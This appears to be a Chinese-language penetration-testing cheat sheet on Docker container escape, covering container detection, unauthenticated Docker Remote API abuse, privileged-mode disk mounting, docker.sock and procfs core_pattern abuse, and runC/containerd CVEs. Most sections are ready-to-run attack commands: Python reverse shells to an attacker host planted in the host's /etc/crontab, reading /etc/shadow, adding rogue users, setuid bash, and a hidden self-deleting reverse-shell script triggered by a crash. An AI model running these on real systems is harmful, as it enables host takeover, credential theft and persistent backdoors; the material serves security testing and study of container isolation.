# 容器逃逸

## 识别docker容器

### 1. 检查根目录下是否存在.dockerenv文件

```bash
ls -al / | grep .dockerenv
```

### 2. 检查 /proc/1/cgroup 是否存在含有docker字符串

```bash
cat /proc/1/cgroup | grep docker
```

## 逃逸方式

### Container Escape: All You Need is Cap (Capabilities)

<https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities>

### HackTricks - Docker Breakout / Privilege Escalation

<https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation>

### 〇. 使用工具：CDK

<https://github.com/cdk-team/CDK>

### 一. Docker Remote API未授权访问逃逸

<https://blog.csdn.net/qq_64973687/article/details/132187299>

#### 基础知识

Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，其默认绑定2375端口，如管理员对其配置不当可导致未授权访问漏洞。

```bash
dockerd -H=0.0.0.0:2375 -H unix:///var/run/docker.sock
```

攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可导致敏感信息泄露，甚至可进一步利用Docker自身特性，借助容器逃逸，最终完全控制宿主服务器

Docker daemon 是 Docker 引擎的后台进程，也称为 Dockerd。它是一个长时间运行的进程，负责管理 Docker 镜像、容器、网络和存储等各种资源，并提供一个 API 以供 Docker 客户端进行交互

当您在 Docker 主机上使用 Docker 命令时（例如 docker run），Docker 客户端将向 Docker daemon 发送命令请求，并通过 Docker API 进行通信。Docker daemon 接收并解析这些请求，并在其内部管理对象存储中创建、修改或删除相应的 Docker 资源。随后，Docker daemon 将响应结果发送回客户端，然后等待下一个命令请求

另外，Docker daemon 也负责监视 Docker 主机上正在运行的容器和服务，以及处理与 Docker 网络和存储相关的操作。它还可以与其他 Docker daemon 进行通信，以实现跨主机的镜像和容器管理。总之，Docker daemon 是整个 Docker 引擎的核心组件，负责实现 Docker 的各种功能，并将其暴露给用户和其他程序使用

#### 漏洞验证

访问 http 请求 `curl $宿主机IP:2375/info`，如果返回内容含有DockerRootDir等字符，则证明存在docker未授权访问漏洞

```bash
curl $宿主机IP:2375/info | grep DockerRootDir
```

#### 漏洞利用

```bash
docker -H tcp://$宿主机IP:2375 ps -a
```

新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下，此时修改/mnt/etc/crontab相当于修改/etc/crontab文件

```bash
docker -H tcp://$宿主机IP:2375 run -it -v /:/mnt nginx:latest /bin/bash
```

在容器内执行命令，将反弹shell的脚本写入到/etc/crontab文件

```bash
echo -e "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$攻击机IP\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /mnt/etc/crontab
```

### 二. privileged特权模式启动容器逃逸

<https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html>

<https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged>

#### 漏洞环境

```bash
docker run -itd --privileged ubuntu /bin/bash
```

#### 漏洞判断

判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。

```bash
cat /proc/self/status |grep CapEff
```

#### 漏洞利用

##### 方法一：磁盘挂载

在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。

```bash
fdisk -l
mkdir /mnt
mount /dev/sda1 /mnt
```

尝试访问宿主机 shadow 文件

```bash
cat /mnt/etc/shadow
```

写入定时任务反弹shell（不同系统可能路径不同）

```bash
echo -e "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$攻击机IP\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /mnt/etc/crontab
```

##### 方法二：通过新添加的用户登录

```bash
mount /dev/sda1 /mnt
chroot /mnt adduser john
```

##### 其他方法

<https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged--hostpid>

### 三. 挂载根目录

挂在了根目录到容器内，容器内可以直接修改宿主机文件

漏洞利用同上

### 四. 挂载用户目录

如果这个用户目录对于的用户可以登录，则可以进行如下操作逃逸

```bash
user@host:~$ cp /bin/bash .
```

```bash
root@container:/home/user# chown root:root ./bash
root@container:/home/user# chmod +s ./bash
```

```bash
user@host:~$ ./bash -p # 这样就可以以root权限执行bash，但是whoami还是user
```

> Invoked with unequal effective and real uid/gids
>
> 以不同的有效和实际用户ID/组ID调用
>
> If Bash is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
>
> 如果Bash以有效用户（组）ID不等于真实用户（组）ID启动，并且未提供 -p 选项，则不会读取启动文件，不会从环境中继承shell函数，如果环境中出现SHELLOPTS、BASHOPTS、CDPATH和GLOBIGNORE变量，则会被忽略，并且有效用户ID将设置为真实用户ID。如果在调用时提供了 -p 选项，则启动行为相同，但有效用户ID不会被重置。

### 四. 挂载Docker Socket

在启动docker容器时，将宿主机`/var/run/docker.sock`文件挂载到docker容器中，在docker容器中，也可以操作宿主机的docker。

#### 漏洞验证

```bash
find / -name docker.sock 
```

#### 漏洞利用

在docker容器中安装docker

```bash
apt-get update
apt-get install docker.io
```

使用命令查看宿主机拉取的镜像。

```bash
docker -H unix://var/run/docker.sock images
```

在docker容器中，使用命令再运行一个docker容器,将宿主机的根目录挂载到ubuntu的test目录中，造成docker逃逸，在通过写计划任务方式，反弹shell，具体同上

```bash
docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu /bin/bash
ls /test
```

### 五. 挂载宿主机procfs逃逸

<https://www.freebuf.com/articles/system/383583.html>

挂载宿主机的 procfs 文件系统通常是为了让容器可以访问主机的进程信息。然而，在某些情况下，滥用挂载 procfs 可能导致容器逃逸，即容器能够访问宿主机上其他进程的敏感信息。在 Docker 中，默认情况下，容器内的 procfs 文件系统被挂载为只读。因此，容器内的进程只能查看自己的进程信息，无法访问宿主机的 procfs。这有助于提高容器的隔离性和安全性。然而，如果在创建容器时显式地将宿主机的 procfs 挂载为可读写，或者容器内的进程具有容器特权（例如，使用特权模式运行容器），那么容器就有可能滥用 procfs 功能，以获取宿主机上其他进程的敏感信息。

procfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式，如果/proc/sys/kernel/core_pattern文件中的首个字符是管道符| ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。当利用这种方式进行docker逃逸时，触发条件比较苛刻，需要有进程奔溃才能触发

#### 漏洞环境

```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

#### 漏洞验证

如果找到两个core_pattern文件，那可能就是挂载了宿主机的procfs。

```bash
find / -name core_pattern
```

#### 漏洞利用

##### 方法一：手动

当启动一个容器时，会在/var/lib/docker/overlay2目录下生成一层容器层，容器层里面包括diff、link、lower、merged、work目录，而docker容器的目录保存在merged目录中，通过命令找到当前容器在宿主机下的绝对路径，workdir代表的是docker容器在宿主机中的绝对路径。

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
```

假设当前绝对路径为

`/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged`

向容器内`/host/proc/sys/kernel/core_pattern`写入以下内容

```bash
echo -e "|/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged/tmp/.x.py \rcore    " > /host/proc/sys/kernel/core_pattern
```

然后在容器内创建一个反弹shell /tmp/.x.py

```bash
cat >/tmp/.x.py << EOF

# !/usr/bin/python

import os
import pty
import socket
lhost = "attacker-ip"
lport = 10000
def main():
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")
os.remove('/tmp/.x.py')
s.close()
if __name__ == "__main__":
main()
EOF
chmod +x /tmp/.x.py
```

最后，在容器内运行一个可以崩溃的程序即可，例如：

```c
# include <stdio.h>

int main(void)
{
int *a = NULL;
*a = 1;
return 0;
}
```

可以在其他机器上编译好以后再上传到容器里

##### 方法二：使用CDK

<https://github.com/cdk-team/CDK/releases/>

```bash
./cdk eva
```

发现容器挂载了宿主机的procfs

执行命令

```bash
./cdk run mount-procfs /host/proc $command
```

### 六. 脏牛漏洞实现Docker逃逸

Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。

竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。

在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。

#### 漏洞条件

docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。

### 七. runC容器逃逸漏洞

runc是Docker、CRI-O、Containerd、Kubernetes等底层的容器运行时

#### 1. CVE-2019-5736

##### 影响版本

Docker Version <=18.09.2
runC Version <=1.0-rc6

##### 漏洞利用

<https://github.com/Frichetten/CVE-2019-5736-PoC>

或使用CDK

#### 2. CVE-2021-30465

<https://cactusii.github.io/post/cve-2021-30465-runc-tao-yi-lou-dong/>

<https://cloud.tencent.com/developer/article/1835722>

存在一定的机率问题，使用docker等单个容器管理很难看到效果

##### 影响版本

runc <= 1.0.0-rc94

#### 3. CVE-2024-21626

<https://nitroc.org/posts/cve-2024-21626-illustrated>

##### 影响版本

runC 大于等于 v1.0.0-rc93，小于等于 1.1.11。

containerd 的已修复版本为 1.6.28 和 1.7.13。受影响版本范围为 1.4.7 到 1.6.27 和 1.7.12。

docker 的已修复版本为 25.0.2。

### 八. CVE-2020-15257逃逸

<https://www.freebuf.com/vuls/259292.html>

2020年12月01日，Containerd 官方发布安全更新，修复了 Docker 容器逃逸漏洞（CVE-2020-15257）。 Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。在特定网络条件下，攻击者可通过访问containerd-shim API，从而实现Docker容器逃逸。Containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行。

由于在host模式下，容器与host共享一套Network namespaces，此时containerd-shim API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问。所以当一个容器root权限，且容器的网络模式为--net=host的时候，通过ontainerd-shim API可以达成容器逃逸的目的。

#### 影响版本

containerd < 1.4.3
containerd < 1.3.9

#### 漏洞利用

<https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn>
